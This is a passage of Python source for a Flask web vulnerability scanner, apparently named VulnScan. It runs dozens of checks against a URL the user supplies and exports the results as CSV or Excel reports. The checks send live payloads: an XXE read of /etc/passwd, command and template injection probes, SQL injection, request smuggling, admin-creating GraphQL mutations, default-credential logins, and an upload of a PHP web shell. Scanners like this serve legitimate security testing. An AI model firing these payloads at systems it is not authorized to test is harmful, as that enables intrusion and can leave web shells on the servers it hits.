def check_host_header_injection(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False,
                        headers={**HEADERS, "Host": "evil.com", "X-Forwarded-Host": "evil.com"})
        if "evil.com" in r.text:
            issues.append("Host header injection — server reflects injected Host in response")
    except: pass
    return {"name": "Host Header Injection", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-74"}

def check_xxe(url, session):
    issues = []
    xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    for ep in ["/api", "/upload", "/xml", "/soap", "/service", "/parse"]:
        try:
            r = session.post(urllib.parse.urljoin(url, ep), data=xxe_payload,
                             headers={**HEADERS, "Content-Type": "application/xml"}, timeout=TIMEOUT, verify=False)
            if re.search(r"root:.*:0:0:", r.text):
                issues.append(f"XXE confirmed at {ep} — /etc/passwd content returned")
        except: pass
    return {"name": "XML External Entity (XXE)", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2019-0227, CWE-611"}

def check_ssti(url, session):
    issues = []
    payloads = {"{{7*7}}": "49", "${7*7}": "49", "#{7*7}": "49", "<%= 7*7 %>": "49"}
    for payload, expected in payloads.items():
        try:
            r = session.get(f"{url}?q={urllib.parse.quote(payload)}&name={urllib.parse.quote(payload)}", timeout=TIMEOUT, verify=False)
            if expected in r.text:
                issues.append(f"SSTI confirmed with payload '{payload}' — template engine executes expressions")
        except: pass
    return {"name": "Server-Side Template Injection", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CWE-94"}

def check_command_injection(url, session):
    issues = []
    payloads = ["; echo CMDINJECT", "| echo CMDINJECT", "`echo CMDINJECT`", "$(echo CMDINJECT)"]
    for payload in payloads[:2]:
        try:
            r = session.get(f"{url}?cmd={urllib.parse.quote(payload)}&exec={urllib.parse.quote(payload)}", timeout=TIMEOUT, verify=False)
            if "CMDINJECT" in r.text:
                issues.append(f"Command injection confirmed with: {payload}")
        except: pass
    return {"name": "Command Injection", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CWE-78"}

def check_insecure_deserialization(url, session):
    issues = []
    # PHP object injection probe
    payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'
    try:
        r = session.get(f"{url}?data={urllib.parse.quote(payload)}", timeout=TIMEOUT, verify=False)
        if r.status_code == 500 or "unserialize" in r.text.lower():
            issues.append("Possible PHP deserialization error triggered — insecure deserialization risk")
    except: pass
    return {"name": "Insecure Deserialization", "status": "WARN" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2015-8562, CWE-502"}

def check_ldap_injection(url, session):
    issues = []
    payloads = ["*)(uid=*))(|(uid=*", "admin)(&)", "*"]
    for payload in payloads[:1]:
        try:
            r = session.get(f"{url}?user={urllib.parse.quote(payload)}&username={urllib.parse.quote(payload)}", timeout=TIMEOUT, verify=False)
            if any(x in r.text.lower() for x in ["ldap", "active directory", "distinguished name", "dn:"]):
                issues.append(f"LDAP error/info exposed with injection payload")
        except: pass
    return {"name": "LDAP Injection", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-90"}

def check_insecure_file_upload(url, session):
    issues = []
    upload_paths = ["/upload", "/api/upload", "/file/upload", "/uploads", "/media/upload"]
    webshell = b"<?php system($_GET['cmd']); ?>"
    for path in upload_paths:
        try:
            files = {"file": ("shell.php", webshell, "image/jpeg")}
            r = session.post(urllib.parse.urljoin(url, path), files=files, timeout=TIMEOUT, verify=False)
            if r.status_code in (200, 201) and any(x in r.text.lower() for x in ["upload", "success", "url", "path", ".php"]):
                issues.append(f"File upload endpoint accepts PHP files at: {path}")
        except: pass
    return {"name": "Insecure File Upload", "status": "WARN" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CWE-434"}

def check_crlf_injection(url, session):
    issues = []
    payload = "test%0d%0aSet-Cookie:crlfinjected=1"
    try:
        r = session.get(f"{url}?redirect={payload}&url={payload}", timeout=TIMEOUT, allow_redirects=False, verify=False)
        if "crlfinjected" in str(r.headers).lower():
            issues.append("CRLF injection — attacker can inject HTTP headers")
    except: pass
    return {"name": "CRLF Injection", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-113"}

def check_websocket_security(url, session):
    issues = []
    ws_url = url.replace("https://", "wss://").replace("http://", "ws://")
    # We can't do a real WS handshake easily, but check for upgrade headers
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False,
                        headers={**HEADERS, "Upgrade": "websocket", "Connection": "Upgrade",
                                 "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                                 "Origin": "https://evil.com"})
        if r.status_code == 101:
            issues.append("WebSocket accepts connections from arbitrary origins")
    except: pass
    return {"name": "WebSocket Security", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-346"}

def check_content_type_sniffing(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        xcto = r.headers.get("x-content-type-options", "")
        if "nosniff" not in xcto.lower():
            issues.append("X-Content-Type-Options: nosniff missing — MIME sniffing attack risk")
    except: pass
    return {"name": "Content Type Sniffing", "status": "FAIL" if issues else "PASS", "severity": "LOW", "issues": issues, "cve": "CWE-430"}

def check_sri_missing(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        external_scripts = re.findall(r'<script[^>]+src=["\']https?://[^"\']+["\'][^>]*>', r.text, re.IGNORECASE)
        external_styles = re.findall(r'<link[^>]+href=["\']https?://[^"\']+["\'][^>]*>', r.text, re.IGNORECASE)
        for tag in external_scripts + external_styles:
            if "integrity=" not in tag:
                resource = re.search(r'(?:src|href)=["\']([^"\']+)["\']', tag)
                if resource:
                    issues.append(f"External resource without SRI: {resource.group(1)[:80]}")
    except: pass
    return {"name": "Subresource Integrity Missing", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues[:5], "cve": "CWE-353"}

def check_verbose_server_errors(url, session):
    issues = []
    error_paths = ["/api/undefined", "/api/null", "/api/%00", "/?__debug__=1"]
    for path in error_paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code >= 500:
                if len(r.text) > 200 and any(x in r.text.lower() for x in ["exception", "error", "line", "file", "stack"]):
                    issues.append(f"Verbose server error at {path} (HTTP {r.status_code})")
        except: pass
    return {"name": "Verbose Server Errors", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-209"}

def check_session_fixation(url, session):
    issues = []
    try:
        r1 = session.get(url, timeout=TIMEOUT, verify=False)
        cookies_before = {c.name: c.value for c in session.cookies}
        r2 = session.get(url, timeout=TIMEOUT, verify=False)
        cookies_after = {c.name: c.value for c in session.cookies}
        for name in cookies_before:
            if name.lower() in ("session", "sessionid", "phpsessid", "jsessionid", "asp.net_sessionid"):
                if cookies_before[name] == cookies_after.get(name):
                    issues.append(f"Session ID '{name}' not rotated between requests — fixation risk")
    except: pass
    return {"name": "Session Fixation", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-384"}

def check_account_enumeration(url, session):
    issues = []
    login_paths = ["/login", "/api/login", "/auth", "/api/auth", "/signin", "/api/signin"]
    for path in login_paths:
        try:
            r_valid = session.post(urllib.parse.urljoin(url, path),
                                   json={"username": "admin", "password": "wrongpassword"},
                                   headers={**HEADERS, "Content-Type": "application/json"},
                                   timeout=TIMEOUT, verify=False)
            r_invalid = session.post(urllib.parse.urljoin(url, path),
                                     json={"username": "nonexistentuser12345", "password": "wrongpassword"},
                                     headers={**HEADERS, "Content-Type": "application/json"},
                                     timeout=TIMEOUT, verify=False)
            if r_valid.status_code != r_invalid.status_code:
                issues.append(f"Account enumeration at {path}: different responses for valid vs invalid usernames")
            elif r_valid.text != r_invalid.text and len(r_valid.text) > 20:
                issues.append(f"Account enumeration at {path}: response body differs for valid vs invalid users")
        except: pass
    return {"name": "Account Enumeration", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-204"}

def check_idor(url, session):
    issues = []
    idor_paths = ["/api/user/1", "/api/users/1", "/api/account/1", "/api/order/1", "/api/profile/1"]
    for path in idor_paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and len(r.text) > 20:
                issues.append(f"IDOR candidate: {path} returned data without authentication (HTTP 200)")
        except: pass
    return {"name": "Insecure Direct Object Reference", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-639"}

def check_oauth_misconfig(url, session):
    issues = []
    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth", "/.well-known/openid-configuration"]
    for path in oauth_paths:
        try:
            # Test open redirect in redirect_uri
            r = session.get(f"{urllib.parse.urljoin(url, path)}?response_type=code&client_id=test&redirect_uri=https://evil.com",
                            timeout=TIMEOUT, verify=False, allow_redirects=False)
            if r.status_code in (301, 302) and "evil.com" in r.headers.get("location", ""):
                issues.append(f"OAuth open redirect at {path} — redirect_uri not validated")
            # Check for missing state param warning
            r2 = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r2.status_code in (200, 302) and "state" not in r2.text.lower():
                issues.append(f"OAuth endpoint {path} may not enforce state parameter — CSRF risk")
        except: pass
    return {"name": "OAuth Misconfiguration", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-601, CWE-352"}

def check_exposed_debug_endpoints(url, session):
    debug_paths = ["/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
                   "/_debug", "/debug", "/trace", "/api/debug", "/health", "/metrics",
                   "/actuator/beans", "/actuator/mappings", "/actuator/loggers",
                   "/__admin", "/server-info", "/diagnostics"]
    issues = []
    for path in debug_paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and len(r.content) > 50:
                issues.append(f"Debug/monitoring endpoint exposed: {path}")
        except: pass
    return {"name": "Exposed Debug Endpoints", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-215"}

def check_missing_auth_api(url, session):
    issues = []
    auth_required = ["/api/admin", "/api/users", "/api/accounts", "/api/config",
                     "/api/settings", "/api/logs", "/api/keys", "/api/secrets"]
    for path in auth_required:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False,
                            headers={k: v for k, v in HEADERS.items() if k != "Authorization"})
            if r.status_code == 200 and len(r.text) > 50:
                issues.append(f"Sensitive API endpoint accessible without auth: {path}")
        except: pass
    return {"name": "Missing Function Level Access Control", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CWE-285"}

def check_server_timing_leak(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        st = r.headers.get("server-timing", "")
        if st:
            issues.append(f"Server-Timing header exposes internal performance data: {st[:100]}")
    except: pass
    return {"name": "Server Timing Information Leak", "status": "WARN" if issues else "PASS", "severity": "LOW", "issues": issues, "cve": "CWE-200"}

def check_feature_policy(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        pp = r.headers.get("permissions-policy", r.headers.get("feature-policy", ""))
        if not pp:
            issues.append("Permissions-Policy header missing — browser features unrestricted")
    except: pass
    return {"name": "Feature Policy Misconfiguration", "status": "WARN" if issues else "PASS", "severity": "LOW", "issues": issues, "cve": "CWE-693"}

def check_proxy_headers(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False,
                        headers={**HEADERS, "X-Forwarded-For": "127.0.0.1",
                                 "X-Original-URL": "/admin", "X-Rewrite-URL": "/admin"})
        if r.status_code == 200 and "admin" in r.text.lower():
            issues.append("Server trusts X-Forwarded-For or X-Original-URL headers — auth bypass risk")
    except: pass
    return {"name": "Broken Object Level Authorization", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-639"}

def check_cve_proxylogon(url, session):
    issues = []
    try:
        r = session.get(urllib.parse.urljoin(url, "/owa/"), timeout=TIMEOUT, verify=False)
        if r.status_code in (200, 302) and "outlook" in r.text.lower():
            issues.append("Microsoft Exchange OWA detected — verify patched against ProxyLogon (CVE-2021-26855)")
    except: pass
    return {"name": "CVE-2021-26855 (ProxyLogon)", "status": "WARN" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2021-26855"}

def check_cve_f5_bigip(url, session):
    issues = []
    try:
        r = session.get(urllib.parse.urljoin(url, "/tmui/login.jsp"), timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and ("big-ip" in r.text.lower() or "f5" in r.text.lower()):
            issues.append("F5 BIG-IP management interface detected — verify patched against CVE-2022-1388")
    except: pass
    return {"name": "CVE-2022-1388 (F5 BIG-IP)", "status": "WARN" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2022-1388"}

def check_http2_rapid_reset(url, session):
    issues = []
    try:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme == "https":
            import http.client
            # Check if HTTP/2 is supported via ALPN
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            with ctx.wrap_socket(socket.create_connection((parsed.hostname, parsed.port or 443), timeout=TIMEOUT),
                                 server_hostname=parsed.hostname) as s:
                proto = s.selected_alpn_protocol()
                if proto == "h2":
                    issues.append("HTTP/2 detected — verify server is patched against Rapid Reset DoS (CVE-2023-44487)")
    except: pass
    return {"name": "CVE-2023-44487 (HTTP/2 Rapid Reset)", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CVE-2023-44487"}

def check_unvalidated_input(url, session):
    issues = []
    payloads = ["<>\"'%;)(&+", "../../../../", "||ping -c 1 127.0.0.1||"]
    for payload in payloads[:1]:
        try:
            r = session.get(f"{url}?input={urllib.parse.quote(payload)}", timeout=TIMEOUT, verify=False)
            if r.status_code == 500:
                issues.append(f"Server error (500) triggered by special chars — input not validated")
        except: pass
    return {"name": "Unvalidated Input", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-20"}

def check_prototype_pollution(url, session):
    issues = []
    payloads = ['{"__proto__":{"admin":true}}', '{"constructor":{"prototype":{"admin":true}}}']
    for ep in ["/api", "/api/v1", "/graphql", "/data"]:
        try:
            r = session.post(urllib.parse.urljoin(url, ep), data=payloads[0],
                             headers={**HEADERS, "Content-Type": "application/json"}, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and "admin" in r.text.lower():
                issues.append(f"Possible prototype pollution at {ep}")
        except: pass
    return {"name": "Prototype Pollution", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-1321"}

def check_insufficient_logging(url, session):
    issues = []
    try:
        # Fire some obviously bad requests and check if any security headers suggest logging/WAF
        r = session.get(f"{url}?id=1' OR 1=1--", timeout=TIMEOUT, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        has_waf = any(h in headers for h in ["x-waf", "x-firewall", "x-protected-by", "cf-ray", "x-sucuri-id"])
        if not has_waf and r.status_code == 200:
            issues.append("No WAF/security monitoring headers detected — may indicate insufficient logging/alerting")
    except: pass
    return {"name": "Insufficient Logging", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-778"}

def check_dns_rebinding(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False,
                        headers={**HEADERS, "Host": "localhost"})
        if r.status_code == 200 and r.headers.get("access-control-allow-origin") == "*":
            issues.append("Wide-open CORS + unenforced Host header may enable DNS rebinding attacks")
    except: pass
    return {"name": "DNS Rebinding", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-346"}

def check_api_endpoint_enumeration(url, session):
    issues = []
    common = ["/api", "/api/v1", "/api/v2", "/rest", "/services", "/endpoints",
              "/api/users", "/api/admin", "/api/config", "/api/status"]
    found = []
    for path in common:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code in (200, 401, 403):
                found.append(f"{path} (HTTP {r.status_code})")
        except: pass
    if len(found) >= 3:
        issues.append(f"Multiple API endpoints enumerable: {', '.join(found[:5])}")
    return {"name": "API Endpoint Enumeration", "status": "WARN" if issues else "PASS", "severity": "LOW", "issues": issues, "cve": "CWE-200"}

def check_security_misconfiguration(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        # Default pages / frameworks
        if any(x in r.text.lower() for x in ["welcome to nginx", "apache2 default page", "it works!", "iis windows server"]):
            issues.append("Default web server page exposed — server not properly configured")
        if "x-aspnet-version" in headers:
            issues.append(f"ASP.NET version exposed: {headers['x-aspnet-version']}")
        if "x-aspnetmvc-version" in headers:
            issues.append(f"ASP.NET MVC version exposed: {headers['x-aspnetmvc-version']}")
    except: pass
    return {"name": "Security Misconfiguration", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-16"}

def check_graphql_mutation_abuse(url, session):
    issues = []
    mutation = '{"query":"mutation { createUser(username: \\"hacker\\", role: \\"admin\\") { id } }"}'
    for ep in ["/graphql", "/api/graphql"]:
        try:
            r = session.post(urllib.parse.urljoin(url, ep), data=mutation,
                             headers={**HEADERS, "Content-Type": "application/json"}, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and "errors" not in r.text.lower() and "data" in r.text.lower():
                issues.append(f"GraphQL mutation accepted without authentication at {ep}")
        except: pass
    return {"name": "GraphQL Mutation Abuse", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-285"}

def check_weak_password_policy(url, session):
    issues = []
    login_paths = ["/api/login", "/login", "/auth", "/api/auth"]
    weak_creds = [("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("root", "root")]
    for path in login_paths[:2]:
        for user, passwd in weak_creds[:2]:
            try:
                r = session.post(urllib.parse.urljoin(url, path),
                                 json={"username": user, "password": passwd},
                                 headers={**HEADERS, "Content-Type": "application/json"},
                                 timeout=TIMEOUT, verify=False)
                if r.status_code in (200, 201) and any(x in r.text.lower() for x in ["token", "session", "welcome", "dashboard"]):
                    issues.append(f"Default credentials work: {user}/{passwd} at {path}")
            except: pass
    return {"name": "Weak Password Policy", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CWE-521"}

def check_cache_poisoning(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False,
                        headers={**HEADERS, "X-Forwarded-Host": "evil.com", "X-Host": "evil.com"})
        if "evil.com" in r.text:
            issues.append("Cache poisoning possible — X-Forwarded-Host reflected in response")
        cc = r.headers.get("cache-control", "")
        if not cc or "no-store" not in cc.lower() and "private" not in cc.lower():
            if r.headers.get("set-cookie"):
                issues.append("Authenticated response may be cached — missing Cache-Control: no-store")
    except: pass
    return {"name": "Cache Poisoning", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-524"}

def check_dependency_confusion(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        # Look for package.json or requirements.txt exposed
        for path in ["/package.json", "/requirements.txt", "/Gemfile", "/composer.json", "/go.mod"]:
            pr = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if pr.status_code == 200 and len(pr.text) > 20:
                issues.append(f"Dependency manifest exposed: {path} — dependency confusion risk")
    except: pass
    return {"name": "Dependency Confusion", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-427"}

def check_http_request_smuggling(url, session):
    issues = []
    try:
        # Send ambiguous Content-Length / Transfer-Encoding headers
        r = session.post(url, data="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
                         headers={**HEADERS, "Transfer-Encoding": "chunked", "Content-Length": "6"},
                         timeout=TIMEOUT, verify=False)
        if r.status_code in (200, 403) and "admin" in r.text.lower():
            issues.append("Possible HTTP request smuggling — ambiguous headers accepted")
    except: pass
    return {"name": "HTTP Request Smuggling", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-444"}

def check_saml_vulnerabilities(url, session):
    issues = []
    saml_paths = ["/saml", "/saml/acs", "/sso/saml", "/auth/saml", "/saml2/acs"]
    for path in saml_paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code in (200, 400, 405) and any(x in r.text.lower() for x in ["saml", "assertion", "idp"]):
                issues.append(f"SAML endpoint detected at {path} — verify against XML signature wrapping attacks")
        except: pass
    return {"name": "SAML Vulnerabilities", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CVE-2017-11427"}

def check_insecure_password_reset(url, session):
    issues = []
    reset_paths = ["/reset-password", "/forgot-password", "/api/reset", "/api/password/reset", "/account/recover"]
    for path in reset_paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                if "token" in urllib.parse.urlparse(r.url).query.lower():
                    issues.append(f"Password reset token in URL at {path} — tokens may be logged")
                issues.append(f"Password reset endpoint found at {path} — verify token strength and expiry")
        except: pass
    return {"name": "Insecure Password Reset", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-640"}

def check_redog(url, session):
    issues = []
    # Send a ReDoS-style payload
    payload = "a" * 50 + "!"
    try:
        start = time.time()
        r = session.get(f"{url}?q={urllib.parse.quote(payload)}&search={urllib.parse.quote(payload)}",
                        timeout=TIMEOUT, verify=False)
        elapsed = time.time() - start
        if elapsed > 5:
            issues.append(f"Slow response ({elapsed:.1f}s) with ReDoS payload — regex DoS possible")
    except: pass
    return {"name": "ReDoS", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-1333"}

# ══════════════════════════════════════════════════════════
# ALL CHECKS REGISTRY
# ══════════════════════════════════════════════════════════

ALL_CHECKS = [
    # Original 20
    check_security_headers, check_ssl_tls, check_open_redirect, check_sql_injection,
    check_xss, check_directory_listing, check_sensitive_files, check_cors,
    check_http_methods, check_clickjacking, check_rate_limiting, check_information_disclosure,
    check_admin_panels, check_cookie_security, check_cve_log4shell, check_spring4shell,
    check_path_traversal, check_ssrf, check_cve_shellshock, check_hsts,
    # New API & modern app checks
    check_graphql_introspection, check_graphql_depth, check_api_versioning,
    check_jwt_none_alg, check_jwt_weak_secret, check_api_key_in_url,
    check_mass_assignment, check_api_rate_limiting, check_swagger_exposure,
    check_http_parameter_pollution, check_host_header_injection, check_xxe,
    check_ssti, check_command_injection, check_insecure_deserialization,
    check_ldap_injection, check_insecure_file_upload, check_crlf_injection,
    check_websocket_security, check_content_type_sniffing, check_sri_missing,
    check_verbose_server_errors, check_session_fixation, check_account_enumeration,
    check_idor, check_oauth_misconfig, check_exposed_debug_endpoints,
    check_missing_auth_api, check_server_timing_leak, check_feature_policy,
    check_proxy_headers, check_cve_proxylogon, check_cve_f5_bigip,
    check_http2_rapid_reset, check_unvalidated_input, check_prototype_pollution,
    check_insufficient_logging, check_dns_rebinding, check_api_endpoint_enumeration,
    check_security_misconfiguration, check_graphql_mutation_abuse, check_weak_password_policy,
    check_cache_poisoning, check_dependency_confusion, check_http_request_smuggling,
    check_saml_vulnerabilities, check_insecure_password_reset, check_redog,
]

# ══════════════════════════════════════════════════════════
# ROUTES
# ══════════════════════════════════════════════════════════

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/scan", methods=["POST"])
def scan():
    data = request.get_json()
    url = data.get("url", "").strip()
    agreed = data.get("agreed", False)

    if not agreed:
        return jsonify({"error": "You must agree to the authorization disclaimer."}), 400
    if not url:
        return jsonify({"error": "No URL provided."}), 400
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    session = requests.Session()
    session.headers.update(HEADERS)
    session.max_redirects = 5

    results = []
    start = time.time()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check, url, session): check.__name__ for check in ALL_CHECKS}
        for future in as_completed(futures):
            try:
                result = future.result()
                result["fix"] = get_fix(result["name"])
                results.append(result)
            except Exception as e:
                results.append({"name": futures[future], "status": "ERROR",
                                "severity": "UNKNOWN", "issues": [str(e)], "cve": "", "fix": ""})

    elapsed = round(time.time() - start, 2)
    summary = {
        "total": len(results),
        "pass": sum(1 for r in results if r["status"] == "PASS"),
        "fail": sum(1 for r in results if r["status"] == "FAIL"),
        "warn": sum(1 for r in results if r["status"] == "WARN"),
        "error": sum(1 for r in results if r["status"] == "ERROR"),
        "critical": sum(1 for r in results if r["severity"] == "CRITICAL" and r["status"] == "FAIL"),
        "elapsed": elapsed,
        "url": url,
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    }
    return jsonify({"results": results, "summary": summary})

@app.route("/export/csv", methods=["POST"])
def export_csv():
    data = request.get_json()
    results = data.get("results", [])
    summary = data.get("summary", {})

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["VulnScan Report"])
    writer.writerow(["Target", summary.get("url", ""), "Timestamp", summary.get("timestamp", ""), "Scan Duration", f"{summary.get('elapsed', '')}s"])
    writer.writerow([])
    writer.writerow(["Check Name", "Status", "Severity", "CVE / Reference", "Issues Found", "Recommended Fix"])
    for r in results:
        issues_str = "; ".join(r.get("issues", [])) if r.get("issues") else "None"
        writer.writerow([r.get("name", ""), r.get("status", ""), r.get("severity", ""),
                         r.get("cve", ""), issues_str, r.get("fix", "")])
    writer.writerow([])
    writer.writerow(["SUMMARY"])
    writer.writerow(["Total Checks", summary.get("total", ""), "Passed", summary.get("pass", ""),
                     "Failed", summary.get("fail", ""), "Warnings", summary.get("warn", ""),
                     "Critical", summary.get("critical", "")])

    output.seek(0)
    return send_file(
        io.BytesIO(output.getvalue().encode("utf-8")),
        mimetype="text/csv",
        as_attachment=True,
        download_name=f"vulnscan-report-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}.csv"
    )

@app.route("/export/xlsx", methods=["POST"])
def export_xlsx():
    try:
        import openpyxl
        from openpyxl.styles import PatternFill, Font, Alignment, Border, Side
        from openpyxl.utils import get_column_letter
    except ImportError:
        return jsonify({"error": "openpyxl not installed. Run: pip install openpyxl"}), 500

    data = request.get_json()
    results = data.get("results", [])
    summary = data.get("summary", {})

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "VulnScan Report"

    # Color palette
    colors = {
        "CRITICAL": "C0392B", "HIGH": "E67E22", "MEDIUM": "F39C12",
        "LOW": "27AE60", "PASS": "1E8449", "FAIL": "C0392B",
        "WARN": "D4AC0D", "ERROR": "7F8C8D", "header": "0A1628", "subheader": "1A2F45"
    }

    thin = Side(style="thin", color="2C3E50")
    border = Border(left=thin, right=thin, top=thin, bottom=thin)

    def cell_style(ws, row, col, value, bold=False, bg=None, fg="FFFFFF", wrap=False, size=10):
        c = ws.cell(row=row, column=col, value=value)
        c.font = Font(bold=bold, color=fg, size=size, name="Calibri")
        if bg:
            c.fill = PatternFill("solid", fgColor=bg)
        c.alignment = Alignment(wrap_text=wrap, vertical="top")
        c.border = border
        return c

    # Title block
    ws.merge_cells("A1:F1")
    title = ws["A1"]
    title.value = "🛡️  VulnScan Security Report"
    title.font = Font(bold=True, size=18, color="00D4AA", name="Calibri")
    title.fill = PatternFill("solid", fgColor=colors["header"])
    title.alignment = Alignment(horizontal="center", vertical="center")
    ws.row_dimensions[1].height = 40

    # Meta info
    meta = [
        ["Target URL", summary.get("url", "")],
        ["Scan Date", summary.get("timestamp", "")],
        ["Duration", f"{summary.get('elapsed', '')} seconds"],
        ["Total Checks", summary.get("total", "")],
        ["Passed", summary.get("pass", "")],
        ["Failed", summary.get("fail", "")],
        ["Warnings", summary.get("warn", "")],
        ["Critical Findings", summary.get("critical", "")],
    ]
    for i, (k, v) in enumerate(meta):
        cell_style(ws, 2 + i, 1, k, bold=True, bg=colors["subheader"], size=9)
        c = ws.cell(row=2 + i, column=2, value=str(v))
        c.font = Font(size=9, name="Calibri")
        c.fill = PatternFill("solid", fgColor="0E1A2B")
        c.font = Font(color="C9D4E0", size=9, name="Calibri")
        ws.merge_cells(f"B{2+i}:F{2+i}")

    # Column headers
    header_row = 11
    headers = ["Check Name", "Status", "Severity", "CVE / Reference", "Issues Found", "Recommended Fix"]
    col_widths = [32, 10, 12, 28, 55, 65]
    for col, (h, w) in enumerate(zip(headers, col_widths), 1):
        cell_style(ws, header_row, col, h, bold=True, bg="00D4AA", fg="080C10", size=10)
        ws.column_dimensions[get_column_letter(col)].width = w
    ws.row_dimensions[header_row].height = 22

    # Sort results
    order = {"FAIL": 0, "WARN": 1, "ERROR": 2, "PASS": 3}
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "UNKNOWN": 4}
    results_sorted = sorted(results, key=lambda x: (order.get(x["status"], 9), sev_order.get(x["severity"], 9)))

    for i, r in enumerate(results_sorted):
        row = header_row + 1 + i
        issues_str = "; ".join(r.get("issues", [])) if r.get("issues") else "✓ No issues detected"
        status = r.get("status", "")
        severity = r.get("severity", "")
        row_bg = "111C2A" if i % 2 == 0 else "0E1419"

        cell_style(ws, row, 1, r.get("name", ""), bg=row_bg, fg="C9D4E0")
        # Status cell with color
        status_color = colors.get(status, "7F8C8D")
        cell_style(ws, row, 2, status, bold=True, bg=status_color, fg="FFFFFF")
